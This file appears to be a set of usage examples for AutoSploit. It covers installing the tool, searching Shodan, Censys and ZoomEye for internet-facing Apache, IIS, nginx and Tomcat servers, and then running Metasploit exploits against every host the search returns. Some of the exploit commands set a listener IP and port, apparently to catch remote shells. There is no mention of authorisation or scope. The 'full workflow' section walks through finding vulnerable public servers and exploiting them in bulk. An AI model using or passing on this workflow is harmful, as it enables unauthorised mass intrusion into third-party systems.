This file contains examples of how to use AutoSploit.

================================================================================
== Installation ==
================================================================================

# 1. Clone the repository from GitHub
git clone https://github.com/NullArray/AutoSploit

# 2. Navigate into the cloned directory
cd AutoSploit

# 3. Make the installer executable
chmod +x install.sh

# 4. Run the installer
./install.sh


================================================================================
== Usage ==
================================================================================

---
--- Interactive Mode ---
---

# Start the interactive console to be guided through the process.
python autosploit.py


---
--- Searching for Targets ---
---

# Search for hosts running 'Apache' using Shodan.
python autosploit.py -s -q "Apache"

# Search for hosts with 'IIS' using Censys.
python autosploit.py -c -q "IIS"

# Search for 'nginx' servers using ZoomEye.
python autosploit.py -z -q "nginx"

# Search across all available search engines for 'Tomcat'.
python autosploit.py -a -q "Tomcat"

# Perform a search using a random User-Agent and a proxy.
python autosploit.py -s -q "Apache" --random-agent --proxy socks5://127.0.0.1:9050


---
--- Exploiting Targets ---
---

# After gathering hosts from a search, run the exploit modules against them.
# This command assumes you have already run a search command like the ones above.
python autosploit.py -e

# Configure Metasploit settings before running the exploit phase.
# This sets the workspace to 'myproject', LHOST to '192.168.1.10', and LPORT to '4444'.
python autosploit.py -e -C myproject 192.168.1.10 4444


================================================================================
== Full Workflow Example ==
================================================================================

# 1. Search for vulnerable 'Apache' servers on Shodan.
python autosploit.py -s -q "product:Apache"

# 2. Launch the exploitation phase against the hosts found in the previous step.
#    This will use the default Metasploit configuration.
python autosploit.py -e

# --- OR ---

# A more advanced workflow in a single (conceptual) sequence:
# 1. Search for 'Microsoft-IIS httpd 6.0' using all search engines.
python autosploit.py -a -q "Microsoft-IIS httpd 6.0"

# 2. Run exploits, configuring MSF to use the 'iis_6' workspace, with a listener
#    on your local IP '10.0.0.5' and port '9001'.
python autosploit.py -e -C iis_6 10.0.0.5 9001
